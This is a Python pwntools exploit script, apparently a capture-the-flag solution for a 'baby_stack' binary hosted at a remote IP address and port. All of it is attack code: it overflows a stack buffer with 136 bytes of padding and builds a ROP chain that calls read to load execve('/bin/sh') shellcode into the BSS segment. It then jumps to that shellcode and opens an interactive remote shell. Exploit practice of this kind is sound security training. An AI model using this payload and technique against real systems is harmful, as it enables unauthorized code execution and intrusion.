#!/usr/bin/env python
from pwn import *

#r = process('./baby_stack')
r = remote('202.125.94.131', 5001)
bss_addr = 0x0000000000601030
pop_rdi = 0x0000000000400583
pop_rsi_r15 = 0x0000000000400581
read_plt = 0x00000000004003f0
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

p = ''
p += 'A' * 136
p += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(bss_addr) + 'AAAAAAAA' + p64(read_plt)
p += p64(bss_addr)

r.sendline(p)
r.sendline(shellcode)
r.interactive()
